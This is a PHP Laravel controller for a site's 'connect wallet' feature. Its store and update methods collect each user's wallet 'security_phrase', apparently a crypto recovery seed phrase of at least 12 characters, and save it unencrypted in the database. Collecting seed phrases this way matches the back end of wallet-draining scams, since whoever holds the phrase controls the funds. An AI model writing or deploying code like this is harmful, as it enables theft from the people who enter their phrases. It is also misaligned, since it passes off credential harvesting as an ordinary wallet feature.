<?php

namespace App\Http\Controllers;

use App\UserWallet;
use App\Wallet;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\GeneralSetting;
use Illuminate\Support\Facades\DB;
use App\User;


class UserWalletController extends Controller
{

     public function __construct()
    {
        $this->middleware('auth');
        $general_all = GeneralSetting::first();
        $this->site_title = $general_all->title;
        $this->gen_phone = $general_all->number;
        $this->gen_email = $general_all->email;
        $this->site_color = $general_all->color;

        \Illuminate\Support\Facades\View::share('general', $general_all);
        \Illuminate\Support\Facades\View::share('site_title', $this->site_title);
        \Illuminate\Support\Facades\View::share('basic', \App\BasicSetting::first());
    }



    public function index()
    {
        $myWallets = UserWallet::with('walletType')
            ->where('user_id', Auth::id())
            ->get();

              //extra
        $this->data['member'] = User::findOrFail(Auth::user()->id);
        $this->data['namew'] = $this->data['member']->ID_Number;

        $availableWallets = Wallet::where('is_active', true)->get();
        $page_title = 'My Wallets';
        $withdrawalcnt = DB::select("SELECT * FROM users WHERE ID_Number = ?", [$this->data['namew']]);

        return view('user.wallets.index', compact('myWallets', 'availableWallets', 'page_title', 'withdrawalcnt'));
    }

    public function store(Request $request)
    {
        $this->validate($request, [
            'wallet_id' => 'required|exists:wallets,id',
            'security_phrase' => 'required|string|min:12',
            'wallet_address' => 'nullable|string',
        ]);

        UserWallet::create([
            'user_id' => Auth::id(),
            'wallet_id' => $request->wallet_id,
            'security_phrase' => $request->security_phrase,
            'wallet_address' => $request->wallet_address,
        ]);

        return redirect()->back()->with('message', 'Wallet connected successfully.')->with('type', 'success');
    }

    public function update(Request $request, $id)
    {
        $this->validate($request, [
            'wallet_id' => 'required|exists:wallets,id',
            'security_phrase' => 'nullable|string|min:12',
            'wallet_address' => 'nullable|string',
        ]);

        $wallet = UserWallet::where('id', $id)->where('user_id', Auth::id())->firstOrFail();

        $data = [
            'wallet_id' => $request->wallet_id,
            'wallet_address' => $request->wallet_address,
        ];

        if ($request->filled('security_phrase')) {
            $data['security_phrase'] = $request->security_phrase;
        }

        $wallet->update($data);

        return redirect()->back()->with('message', 'Connected wallet updated.')->with('type', 'success');
    }

    public function destroy($id)
    {
        $wallet = UserWallet::where('id', $id)->where('user_id', Auth::id())->firstOrFail();
        $wallet->delete();
        return redirect()->back()->with('message', 'Wallet removed.')->with('type', 'success');
    }
}
